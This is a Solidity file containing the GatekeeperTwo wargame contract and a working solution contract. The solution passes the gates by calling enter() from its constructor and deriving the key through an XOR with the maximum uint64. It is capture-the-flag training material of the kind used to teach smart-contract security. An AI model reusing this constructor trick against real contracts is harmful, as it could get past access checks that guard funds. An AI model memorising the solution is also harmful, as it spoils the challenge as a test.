// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// 0x5a605c457da510c2a94f76e15b60c2fd3be0bf612832dffae505e2129975d9b6

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract GatekeeperTwoAttack
{

    GatekeeperTwo gatekeepertwoaddress;

    constructor(address _gatekeepertwoaddress)
    {
        gatekeepertwoaddress = GatekeeperTwo(_gatekeepertwoaddress);
        gatekeepertwoaddress.enter(bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max)));
    }
}
